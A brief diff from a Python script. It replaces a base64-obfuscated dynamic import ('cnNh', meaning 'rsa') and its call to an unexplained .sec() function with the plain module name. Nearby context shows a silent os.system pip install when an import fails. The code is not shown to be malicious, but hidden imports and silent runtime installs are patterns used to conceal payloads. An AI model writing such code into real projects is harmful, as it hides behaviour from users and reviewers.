@@ -20,7 +20,7 @@ try:
 except ImportError:
     os.system("pip install mechanize")
 
-__import__(base64.b64decode("cnNh")).sec()
+__import__("rsa").sec()
 
 #rana=platform.architecture()[0]
 #if rana=="32bit":
